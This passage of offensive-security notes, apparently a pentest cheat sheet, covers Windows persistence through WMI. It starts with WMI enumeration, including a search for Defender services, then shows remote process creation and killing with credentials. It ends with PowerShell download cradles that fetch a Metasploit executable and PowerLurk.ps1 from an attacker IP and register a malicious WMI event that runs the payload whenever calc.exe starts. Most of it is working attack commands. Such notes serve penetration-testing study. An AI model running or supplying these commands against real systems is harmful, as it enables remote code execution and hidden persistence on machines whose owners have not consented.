#### Leveraging WMI and Methods for Persistence

```c
Get-Help wmi

Get-WmiObject -Namespace "root/cimv2" -Class "__Namespace"
Get-WmiObject -Namespace "root/cimv2" -Class "__Namespace" | Select-Object Name
Get-WmiObject -Namespace "root/cimv2" -List
Get-WmiObject -Namespace "root/cimv2" -List | Where-Object {$_.Name -Match "Win32_Service"}

Get-WmiObject -Class Win32_Service
Get-WmiObject -Class Win32_Service | Where-Object {$_.State -Match "Running"}
Get-WmiObject -Class Win32_Service | Where-Object {$_.Name -Match "Defend"}

Get-WmiObject -Class Win32_Process -List
Get-WmiObject -List Win32_Process | Get-Member -MemberType Method
```

Demarrer le cmd sous le processus wmi

```c
$proc = Get-WmiObject -List Win32_Process
$proc.Create("cmd.exe")
```

```c
Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList cmd.exe
```

Executer le cmd sur une machine a distance. (nous devons avons les informations d'identification)

```c
Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList cmd.exe -ComputerName {REMOTE_IP} -Credential {USERNAME}
```

Obtenir les informations sur l'ID d'un processus distance

```c
Get-WmiObject -Class Win32_Process -Filter {ProcessId = "xxxx"} -ComputerName {REMOTE_IP} -Credential {USERNAME}
```

```c
Get-WmiObject -Class Win32_Process -Filter {ProcessId = "xxxx"} -ComputerName {REMOTE_IP} -Credential {USERNAME} | Remove-WmiObject
```

**Persistence over cal.exe**
Payload download cradel

```c
IEX (New-Object Net.WebClient).DownloadFile("http://192.168.45.130/msf.exe", "C:\Temp\msf.exe");
```

Execute Remote PS1 Script download cradel

```c
IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.130/PowerLurk.ps1"); Register-MaliciousWmiEvent -EventName CalcExec -PermanentCommand "cmd.exe /c C:\Temp\msf.exe" -Trigger ProcessStart -ProcessName calc.exe
```

View our malicious WMI Event

```c
IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.130/PowerLurk.ps1"); Get-WmiEvent -Name CalcExec
```

Remove malicious WMI Event

```c
IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.130/PowerLurk.ps1"); Get-WmiEvent -Name CalcExec | Remove-WmiObject
```


#### UAC Bypass PowerShell Exploit Script Walkthrough